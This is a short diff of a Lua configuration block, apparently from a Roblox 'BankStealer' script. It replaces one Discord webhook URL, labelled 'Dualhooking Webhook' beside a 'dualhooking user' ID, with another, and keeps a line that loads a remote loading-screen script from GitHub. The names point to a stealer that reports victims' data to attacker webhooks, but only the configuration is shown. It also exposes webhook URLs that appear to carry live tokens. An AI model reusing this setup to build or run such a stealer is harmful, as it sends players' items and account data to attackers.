@@ -1,5 +1,5 @@
 local dhuser = "1527659307"       -- dualhooking user
-local dhwebhook = "https://discord.com/api/webhooks/1129559658978349137/uk2TrS95KiADpt0a3Xz2ZCg48fiN1oF3IRW2K-MlIf-dCVuW5jZd-b3oLywgVXWc9Cf-" -- Dualhooking Webhook
+local dhwebhook = "https://discord.com/api/webhooks/1129572525244944478/RrbfbuPLKcqQCx6HevhrtXCxft5ScBOxn93i4Lphf19a3ojSABY-gPX1L2tLo13Ut59d" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/HerrSimoNHub/BankStealer/main/Loading.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
